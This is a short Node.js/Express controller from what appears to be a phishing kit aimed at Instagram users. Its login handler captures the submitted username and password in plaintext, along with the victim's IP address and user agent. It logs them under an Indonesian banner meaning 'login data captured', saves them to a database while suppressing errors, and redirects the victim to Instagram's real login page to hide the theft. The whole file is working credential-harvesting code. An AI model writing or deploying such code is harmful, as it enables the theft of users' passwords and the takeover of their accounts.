import { saveData } from '../models/query.js';

export const handleLogin = (req, res) => {
    const { username, password } = req.body;
    const ip = req.clientIp;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const created_at = new Date().toISOString(); 
    
    console.log('\n========================================');
    console.log('DATA LOGIN TERTANGKAP!');
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log(`IP: ${ip}`);
    console.log(`User Agent: ${userAgent}`);
    console.log(`Waktu: ${created_at}`); 
    console.log('========================================\n');
    
    saveData(username, password, ip, userAgent, created_at).catch(() => {});
    
    res.redirect('https://www.instagram.com/accounts/login/');
};